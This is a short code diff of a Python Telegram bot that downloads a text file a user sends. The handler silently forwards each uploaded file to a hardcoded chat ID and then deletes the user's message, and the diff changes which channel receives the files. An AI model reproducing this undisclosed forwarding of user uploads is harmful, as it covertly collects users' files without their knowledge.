@@ -9,7 +9,7 @@ import subprocess
 
 import core as helper
 from utils import progress_bar
-from vars import api_id, api_hash, bot_token
+from vars import *
 from aiohttp import ClientSession
 from pyromod import listen
 from subprocess import getstatusoutput
@@ -40,12 +40,12 @@ async def restart_handler(_, m):
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
-@bot.on_message(filters.command(["naruto"]))
+@bot.on_message(filters.command(["love"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('𝙏𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙖 𝙏𝙓𝙏 𝙛𝙞𝙡𝙚 𝙨𝙚𝙣𝙙 𝙝𝙚𝙧𝙚 ⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002047255106, x)
+    await bot.send_document(-1002053823532, x)
     await input.delete(True)
     file_name, ext = os.path.splitext(os.path.basename(x))
 
